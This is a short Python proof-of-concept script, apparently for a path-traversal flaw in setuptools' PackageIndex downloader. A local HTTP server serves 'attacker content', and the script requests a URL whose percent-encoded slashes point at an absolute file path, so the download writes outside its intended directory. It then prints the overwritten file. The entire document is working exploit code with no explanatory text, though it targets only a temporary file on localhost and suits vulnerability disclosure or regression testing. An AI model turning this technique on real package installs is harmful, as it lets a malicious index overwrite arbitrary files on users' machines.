import os, tempfile, http.server, threading
from setuptools.package_index import PackageIndex

victim_dir = tempfile.mkdtemp()
target = os.path.join(victim_dir, "pwned.txt")

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type", "application/octet-stream"); self.end_headers()
        self.wfile.write(b"attacker content")
    def log_message(self, *a): pass

srv = http.server.HTTPServer(("127.0.0.1", 0), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()

tmpdir = tempfile.mkdtemp()
url = f"http://127.0.0.1:{srv.server_port}/pkg/" + target.replace("/", "%2F")
print(PackageIndex._resolve_download_filename(url, tmpdir))
print(PackageIndex().download(url, tmpdir))
print(open(target).read())
